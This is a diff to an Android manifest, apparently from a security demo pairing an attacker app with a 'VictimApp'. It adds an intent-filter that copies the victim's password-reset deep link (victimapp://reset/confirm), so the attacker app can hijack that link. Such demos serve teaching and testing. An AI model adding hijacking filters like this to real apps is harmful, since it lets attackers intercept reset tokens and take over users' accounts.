@@ -20,6 +20,19 @@
 
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
+
+            <!-- Deep Link Hijacking: EXACTLY the same filter as VictimApp's ResetConfirmActivity. -->
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+
+                <data
+                    android:scheme="victimapp"
+                    android:host="reset"
+                    android:path="/confirm" />
+            </intent-filter>
         </activity>
     </application>
 
